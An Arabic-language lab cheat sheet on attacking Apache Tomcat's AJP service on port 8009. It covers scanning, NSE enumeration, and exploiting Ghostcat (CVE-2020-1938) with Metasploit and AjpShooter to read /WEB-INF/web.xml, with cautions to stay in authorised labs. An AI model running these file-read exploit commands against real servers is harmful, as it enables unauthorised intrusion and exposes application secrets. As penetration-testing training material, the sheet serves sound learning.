PORT 8009 / TCP — APACHE JServ PROTOCOL (AJP)

AJP — من الفحص إلى ما بعد الاستغلال

Quick Service Reference — مرجع سريع أثناء اللاب لخدمة AJP/Tomcat — اكتشاف، Enumeration، تقييم Ghostcat، ثم الخطوة التالية.

ملاحظة عن البورت: البورت الشائع لـAJP/1.3 هو 8009/TCP، لكنه قابل للتغيير أو قد يكون محصورًا على loopback/interface محددة. إذا لم يظهر على 8009، نفّذ فحص -p- قبل استبعاده.

1. Reconnaissance

ثبّت نطاق اللاب واعرف الهدف والشبكة قبل ما تبدأ الفحص.

معرفة عنوانك وواجهات الشبكة KALI TERMINAL
ip a
ركّز على واجهة الـVPN مثل tun0 إذا كنت داخل لاب.
عرض المسارات والشبكات القابلة للوصول KALI TERMINAL
ip route
اختبار استجابة الهدف KALI TERMINAL
ping -c 4 [TARGET]
عدم الرد على ICMP لا يعني أن الهدف غير متاح؛ انتقل إلى Nmap مع -Pn.
اكتشاف الأجهزة داخل الشبكة عند الحاجة KALI TERMINAL
nmap -sn [SUBNET]

2. Port Scanning

AJP يظهر غالبًا على 8009/TCP، لكن لا تعتمد على البورت الافتراضي فقط.

فحص البورت الافتراضي مع اكتشاف الخدمة KALI TERMINAL
nmap -Pn -p8009 -sV [TARGET]
ابحث عن تعريف مثل ajp13 أو Apache JServ Protocol.
GENERAL REFERENCE — النجاح = Nmap يعرّف AJP/المنتج أو يؤكد أن البروتوكول المتوقع يعمل على البورت.
تشغيل الفحص الافتراضي وVersion Detection KALI TERMINAL
nmap -Pn -p8009 -sC -sV [TARGET]
فحص كل بورتات TCP KALI TERMINAL
nmap -Pn -p- --min-rate 1000 [TARGET]
الفحص السريع الكامل قد يكون مزعجًا خارج اللابات؛ استخدمه فقط ضمن النطاق المصرّح.
إعادة فحص البورت غير القياسي الذي ظهر KALI TERMINAL
nmap -Pn -p[PORT] -sC -sV [TARGET]

3. Enumeration

حدد هل الخدمة AJP فعلًا، وما المسارات/الميثودز التي تسمح بها، وهل يوجد Tomcat خلفها.

Nmap NSE

فحص معلومات AJP الأساسية KALI TERMINAL
nmap -Pn -p[PORT] --script ajp-headers [TARGET]
فحص الـMethods المتاحة KALI TERMINAL
nmap -Pn -p[PORT] --script ajp-methods [TARGET]
فحص متطلبات المصادقة لمسار KALI TERMINAL
nmap -Pn -p[PORT] --script ajp-auth [TARGET]
طلب مسار عبر AJP KALI TERMINAL
nmap -Pn -p[PORT] --script ajp-request --script-args ajp-request.path=/ [TARGET]
إذا كان السكربت متوفرًا في إصدار Nmap عندك، يفيد للتأكد أن الـconnector يستجيب لطلبات AJP.
GENERAL REFERENCE — النجاح = رجوع استجابة للمسار عبر AJP؛ قيّم ما إذا كان الوصول يكشف محتوى غير متاح كما ينبغي.

ربط AJP مع Tomcat/Web

البحث عن منافذ Web/Tomcat الشائعة KALI TERMINAL
nmap -Pn -p8080,8081,80,443 -sV [TARGET]
فحص عنوان HTTP إن ظهر Tomcat KALI TERMINAL
curl -I http://[TARGET]:[HTTP_PORT]/
وجود Tomcat على HTTP مع AJP مفتوح يعطيك سياقًا أقوى قبل الانتقال لتقييم Ghostcat.
البحث عن Modules مرتبطة بـAJP داخل Metasploit MSFCONSOLE
search ajp search tomcat ghostcat
استخدم info [MODULE] واقرأ الشروط قبل التشغيل بدل اختيار Module عشوائي.

4. Credential Testing

AJP غالبًا ليس خدمة Login تقليدية؛ الاختبار هنا يركز على قيود الوصول وConnector Secret وما إذا كانت الحماية مفروضة.

في Tomcat الحديث قد يكون AJP مقيدًا بعنوان loopback أو يتطلب secret. عدم وجود Username/Password عادي على AJP شيء طبيعي.
اختبار AJP Authentication عبر NSE KALI TERMINAL
nmap -Pn -p[PORT] --script ajp-auth [TARGET]
اختبار مسار إداري بدل الجذر KALI TERMINAL
nmap -Pn -p[PORT] --script ajp-auth --script-args ajp-auth.path=/manager/html [TARGET]
المسار قد لا يكون موجودًا أصلًا؛ الهدف معرفة سلوك الحماية فقط.
مراجعة خيارات Modules الخاصة بـAJP MSFCONSOLE
search ajp info [AJP_MODULE] use [AJP_MODULE] show options
إذا ظهر خيار مرتبط بـsecret أو path فاضبطه فقط بناءً على إعدادات اللاب أو المعلومات المكتشفة.
إذا ظهر Tomcat Manager على HTTP افحص نوع الرد أولًا KALI TERMINAL
curl -i http://[TARGET]:[HTTP_PORT]/manager/html
اختبارات كلمات المرور تخص واجهة HTTP/Tomcat Manager وليست AJP نفسه. لا تشغّل brute force لمجرد أن 8009 مفتوح.

5. Exploitation

الاستغلال يعتمد على إعداد Tomcat وإصداره. أشهر مسار مهم هنا هو Ghostcat عند تحقق شروطه.

CVE-2020-1938 — Ghostcat

لا تبدأ الاستغلال قبل التحقق: تأكد أن الهدف Apache Tomcat وأن AJP reachable وأن النسخة/الإعدادات مناسبة. لا تفترض أن كل 8009 مفتوح = Ghostcat.
جمع Version إضافي من HTTP إن كان متاحًا KALI TERMINAL
nmap -Pn -p[HTTP_PORT] -sV --script http-title,http-headers [TARGET]
البحث عن Ghostcat في Metasploit MSFCONSOLE
search ghostcat info [GHOSTCAT_MODULE]
اقرأ DESCRIPTION وOPTIONS وتأكد من RPORT وFILEPATH قبل التشغيل.
ضبط Module بعد اختيار المطابق MSFCONSOLE
use [GHOSTCAT_MODULE] set RHOSTS [TARGET] set RPORT [PORT] show options
قراءة ملف حساس من تطبيق الويب عند سماح Module بذلك MSFCONSOLE
set FILEPATH /WEB-INF/web.xml run
هذا اختبار قراءة ملف داخل لاب مصرح فقط. لا تفترض نجاحه ولا تخترع نتيجة؛ النتيجة تعتمد على النسخة والإعداد.
GENERAL REFERENCE — النجاح = ظهور محتوى الملف المطلوب فعليًا؛ لا تعتبر تشغيل الـModule وحده نجاحًا.

AjpShooter كطريقة بديلة داخل اللاب

قراءة WEB-INF/web.xml باستخدام AjpShooter إذا كانت الأداة لديك KALI TERMINAL
python3 ajpShooter.py http://[TARGET]:[HTTP_PORT] [PORT] /WEB-INF/web.xml read
استخدم هذه الطريقة فقط إذا كانت الأداة مثبتة لديك وتوافق نسختها هذا الـsyntax.
استهداف ملف مختلف بعد نجاح القراءة KALI TERMINAL
python3 ajpShooter.py http://[TARGET]:[HTTP_PORT] [PORT] /WEB-INF/[FILE] read
إذا حصلت على web.xml ركّز على أسماء الـservlets والـroutes والـsecurity-constraints وأي مسارات أو معلومات تكشف بنية التطبيق.
تحويل Ghostcat إلى RCE يحتاج شروطًا إضافية مثل القدرة على زرع ملف JSP في مسار مناسب؛ لا تعامل RCE كأنه مضمون ولا تنفّذ كتابة ملفات إلا إذا اللاب يطلبها صراحة.

6. Post-Exploitation

بعد إثبات الوصول، ثبّت ما وجدته وانتقل فقط للمسار التالي المنطقي.

حفظ web.xml محليًا للتحليل KALI TERMINAL
python3 ajpShooter.py http://[TARGET]:[HTTP_PORT] [PORT] /WEB-INF/web.xml read > web.xml
نفّذها فقط إذا كانت أداة AjpShooter وطريقة الإخراج عندك تعمل كما هو متوقع.
البحث داخل web.xml عن مسارات وقيود KALI TERMINAL
grep -Ei 'servlet|url-pattern|security-constraint|login-config|param-name|param-value' web.xml
فحص المسارات التي اكتشفتها عبر HTTP KALI TERMINAL
curl -i http://[TARGET]:[HTTP_PORT]/[DISCOVERED_PATH]
إعادة فحص الخدمات بعد اكتشاف معلومات جديدة KALI TERMINAL
nmap -Pn -sV -p[DISCOVERED_PORTS] [TARGET]
إذا حصلت لاحقًا على Shell: تحديد المستخدم VICTIM SHELL
whoami
إذا حصلت لاحقًا على Shell: معلومات النظام VICTIM SHELL
id hostname uname -a
بعد Shell انتقل لملف Linux Post-Exploitation بدل تكرار كل أوامر ما بعد الاستغلال هنا.
